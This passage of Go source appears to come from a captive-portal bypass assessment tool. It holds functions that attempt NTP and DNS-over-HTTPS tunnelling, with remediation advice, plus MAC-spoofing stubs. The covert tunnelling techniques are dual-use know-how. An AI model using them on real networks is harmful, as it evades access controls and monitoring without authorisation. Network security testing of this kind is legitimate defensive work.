			Remediation: "Block access to *.workers.dev domains. Inspect HTTPS traffic to Cloudflare for proxy patterns. Consider blocking unknown Cloudflare subdomains.",
		}
	}

	return Result{Method: CFWorkers, Success: false, Details: "CF Workers proxy not functional"}
}

// ---------------------------------------------------------------------------
// Technique 18: NTP tunnel
// ---------------------------------------------------------------------------

func tryNTPTunnel(config *Config, probes *ProbeResults) Result {
	if !probes.NTP.IsOpen {
		return Result{Method: NTPTunnel, Success: false, Details: "NTP (UDP/123) blocked"}
	}

	if config.NTPServer == "" {
		return Result{Method: NTPTunnel, Success: false, Details: "No NTP tunnel server configured (use --ntp-server)"}
	}

	handle, err := tunnel.StartNTPTunnel(config.NTPServer, 1082, 20*time.Second)
	if err != nil {
		return Result{Method: NTPTunnel, Success: false, Details: fmt.Sprintf("Failed: %v", err)}
	}

	if tunnel.VerifySOCKS(handle.LocalPort) {
		return Result{
			Method:      NTPTunnel,
			Success:     true,
			Severity:    "high",
			Impact:      "Internet via NTP tunnel (UDP/123, ~1-10 Kbps -- slow but stealthy)",
			Details:     fmt.Sprintf("Data encoded in NTP extension fields to %s. NTP is almost never blocked.", config.NTPServer),
			Remediation: "Restrict NTP to known time servers only. Inspect NTP packets for abnormal extension fields or payload sizes. Rate-limit NTP traffic per client.",
			Tunnel:      handle,
		}
	}

	handle.Stop()
	return Result{Method: NTPTunnel, Success: false, Details: "NTP tunnel connected but verification failed"}
}

// ---------------------------------------------------------------------------
// Technique 19: DoH tunnel
// ---------------------------------------------------------------------------

func tryDoHTunnel(probes *ProbeResults) Result {
	if !probes.DoH.IsOpen {
		return Result{Method: DoHTunnel, Success: false, Details: "DoH endpoints not reachable"}
	}

	handle, err := tunnel.StartDoHTunnel(1083, "", 15*time.Second)
	if err != nil {
		return Result{Method: DoHTunnel, Success: false, Details: fmt.Sprintf("Failed: %v", err)}
	}

	if handle.Active {
		return Result{
			Method:      DoHTunnel,
			Success:     true,
			Severity:    "high",
			Impact:      "DNS resolution via encrypted DoH (enables further tunneling)",
			Details:     "DNS-over-HTTPS to Cloudflare/Google. Bypasses DNS interception by portal.",
			Remediation: "Block DoH endpoints (cloudflare-dns.com, dns.google) for unauthenticated clients. Deploy DoH-aware filtering.",
			Tunnel:      handle,
		}
	}

	handle.Stop()
	return Result{Method: DoHTunnel, Success: false, Details: "DoH tunnel did not start"}
}

// ---------------------------------------------------------------------------
// Default platform ops -- delegates to the platform package.
// The actual implementations are in platform_darwin.go / platform_linux.go.
// These stubs allow bypass to compile on any platform; the caller should
// inject a real PlatformOps at runtime.
// ---------------------------------------------------------------------------

type defaultPlatformOps struct{}

func (d *defaultPlatformOps) GetGateway(iface string) string       { return "" }
func (d *defaultPlatformOps) GetCurrentMAC(iface string) string    { return "" }
func (d *defaultPlatformOps) GetArpTable() []platform.ArpEntry     { return nil }
func (d *defaultPlatformOps) SetMAC(iface, mac string) bool        { return false }
func (d *defaultPlatformOps) RenewDHCP(iface string)               {}
func (d *defaultPlatformOps) GenerateRandomMAC() string             { return platform.GenerateRandomMAC() }

// logStatus prints inline status during bypass attempts.
func logStatus(format string, args ...any) {
	log.Printf("  "+format, args...)
}
